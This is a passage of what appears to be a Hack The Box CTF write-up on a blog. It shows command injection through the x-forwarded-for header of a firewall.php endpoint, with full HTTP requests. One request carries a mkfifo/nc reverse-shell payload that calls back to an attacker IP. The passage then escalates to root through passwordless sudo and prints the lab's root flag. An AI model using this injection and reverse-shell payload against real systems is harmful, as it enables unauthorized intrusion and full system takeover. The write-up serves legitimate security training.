+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;SNIP&gt;
+</span></span></span></code></pre></div><p>So clearly this command to add a rule in iptables for our IP ran as sudo. We also see that if the x-forwarded-for header is set, then that value will be set to the IP value. This looks like a potential command injection if we can add the x-forwarded-for header with our command injection.</p>
+<p>If we append a semicolon and then use a command which returns information if it doesn&rsquo;t run properly, we will see the output in the response. We use the adduser binary:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-HTTP" data-lang="HTTP"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> /firewall.php <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">10.10.11.128</span>
+</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0</span>
+</span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8</span>
+</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.5</span>
+</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate, br</span>
+</span></span><span style="display:flex;"><span>Origin<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://10.10.11.128</span>
+</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
+</span></span><span style="display:flex;"><span>Referer<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://10.10.11.128/challenge.php</span>
+</span></span><span style="display:flex;"><span>Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">PHPSESSID=avlg76ek0c0kg8g97lto5csgpd</span>
+</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>Priority<span style="color:#f92672">:</span> <span style="color:#ae81ff">u=0, i</span>
+</span></span><span style="display:flex;"><span>x-forwarded-for<span style="color:#f92672">:</span> <span style="color:#ae81ff">;adduser</span>
+</span></span></code></pre></div><p>In the response we get the output when using the adduser binary without supplying any arguments.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-HTTP" data-lang="HTTP"><span style="display:flex;"><span><span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#a6e22e">OK</span>
+</span></span><span style="display:flex;"><span>Server<span style="color:#f92672">:</span> <span style="color:#ae81ff">nginx/1.18.0 (Ubuntu)</span>
+</span></span><span style="display:flex;"><span>Date<span style="color:#f92672">:</span> <span style="color:#ae81ff">Tue, 28 Jan 2025 21:16:46 GMT</span>
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html; charset=UTF-8</span>
+</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
+</span></span><span style="display:flex;"><span>Expires<span style="color:#f92672">:</span> <span style="color:#ae81ff">Thu, 19 Nov 1981 08:52:00 GMT</span>
+</span></span><span style="display:flex;"><span>Cache-Control<span style="color:#f92672">:</span> <span style="color:#ae81ff">no-store, no-cache, must-revalidate</span>
+</span></span><span style="display:flex;"><span>Pragma<span style="color:#f92672">:</span> <span style="color:#ae81ff">no-cache</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">1759</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">link</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css&#34;</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;bootstrap-css&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!------ Include the above in your HEAD tag ----------&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;container&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">h1</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text-center m-5&#34;</span>&gt;Join the UHC - November Qualifiers&lt;/<span style="color:#f92672">h1</span>&gt;
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">div</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">section</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;bg-dark text-center p-5 mt-4&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;container p-5&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>adduser [--home DIR] [--shell SHELL] [--no-create-home] [--uid ID]
+</span></span><span style="display:flex;"><span>[--firstuid ID] [--lastuid ID] [--gecos GECOS] [--ingroup GROUP | --gid ID]
+</span></span><span style="display:flex;"><span>[--disabled-password] [--disabled-login] [--add_extra_groups]
+</span></span><span style="display:flex;"><span>[--encrypt-home] USER
+</span></span><span style="display:flex;"><span>   Add a normal user
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>adduser --system [--home DIR] [--shell SHELL] [--no-create-home] [--uid ID]
+</span></span><span style="display:flex;"><span>[--gecos GECOS] [--group | --ingroup GROUP | --gid ID] [--disabled-password]
+</span></span><span style="display:flex;"><span>[--disabled-login] [--add_extra_groups] USER
+</span></span><span style="display:flex;"><span>   Add a system user
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>adduser --group [--gid ID] GROUP
+</span></span><span style="display:flex;"><span>addgroup [--gid ID] GROUP
+</span></span><span style="display:flex;"><span>   Add a user group
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>addgroup --system [--gid ID] GROUP
+</span></span><span style="display:flex;"><span>   Add a system group
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>adduser USER GROUP
+</span></span><span style="display:flex;"><span>   Add an existing user to an existing group
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>general options:
+</span></span><span style="display:flex;"><span>  --quiet | -q      don&#39;t give process information to stdout
+</span></span><span style="display:flex;"><span>  --force-badname   allow usernames which do not match the
+</span></span><span style="display:flex;"><span>                    NAME_REGEX[_SYSTEM] configuration variable
+</span></span><span style="display:flex;"><span>  --extrausers      uses extra users as the database
+</span></span><span style="display:flex;"><span>  --help | -h       usage message
+</span></span><span style="display:flex;"><span>  --version | -v    version number and copyright
+</span></span><span style="display:flex;"><span>  --conf | -c FILE  use FILE as configuration file
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>              &lt;<span style="color:#f92672">h1</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text-white&#34;</span>&gt;Welcome Back!&lt;/<span style="color:#f92672">h1</span>&gt;
+</span></span><span style="display:flex;"><span>              &lt;<span style="color:#f92672">h3</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text-white&#34;</span>&gt;Your IP Address has now been granted SSH Access.&lt;/<span style="color:#f92672">h3</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;/<span style="color:#f92672">div</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">section</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">div</span>&gt;
+</span></span></code></pre></div><p>Let&rsquo;s try to get a shell. First we set up a nc listener:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$nc -nvlp <span style="color:#ae81ff">7777</span>
+</span></span></code></pre></div><p>Then we add our payload to the x-forwarded-for header:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-HTTP" data-lang="HTTP"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> /firewall.php <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">10.10.11.128</span>
+</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0</span>
+</span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8</span>
+</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.5</span>
+</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate, br</span>
+</span></span><span style="display:flex;"><span>Referer<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://10.10.11.128/challenge.php</span>
+</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
+</span></span><span style="display:flex;"><span>Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">PHPSESSID=avlg76ek0c0kg8g97lto5csgpd</span>
+</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>Priority<span style="color:#f92672">:</span> <span style="color:#ae81ff">u=0, i</span>
+</span></span><span style="display:flex;"><span>X-FORWARDED-FOR<span style="color:#f92672">:</span> <span style="color:#ae81ff">;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.55 7777 &gt;/tmp/f;</span>
+</span></span></code></pre></div><p>And we get a call back!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$nc -nvlp <span style="color:#ae81ff">7777</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">7777</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.14.55<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.11.128<span style="color:#f92672">]</span> <span style="color:#ae81ff">59200</span>
+</span></span><span style="display:flex;"><span>/bin/sh: 0: can<span style="color:#960050;background-color:#1e0010">&#39;</span>t access tty; job control turned off
+</span></span><span style="display:flex;"><span>$ whoami
+</span></span><span style="display:flex;"><span>www-data
+</span></span></code></pre></div><p>We can run all commands as sudo.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo -l
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> www-data on union:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass, secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User www-data may run the following commands on union:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>ALL : ALL<span style="color:#f92672">)</span> NOPASSWD: ALL
+</span></span></code></pre></div><p>So now we just do a <code>sudo -i</code> and get root access and find our flag!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo -i
+</span></span><span style="display:flex;"><span>id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>ls
+</span></span><span style="display:flex;"><span>root.txt
+</span></span><span style="display:flex;"><span>snap
+</span></span><span style="display:flex;"><span>cat root.txt
+</span></span><span style="display:flex;"><span>fd41c35868ae5d4dcc3dfb4498375048
+</span></span></code></pre></div>
+</content>
+<p>
+  
+  <a href="https://example.com/blog/htb/">#HTB</a>
+  
+  <a href="https://example.com/blog/pentesting/">#Pentesting</a>
+  
+</p>
+
+  </main>
+  <footer>Made with <a href="https://github.com/janraasch/hugo-bearblog/">Hugo ʕ•ᴥ•ʔ Bear</a>
+</footer>
+
+    
+</body>
+
+</html>
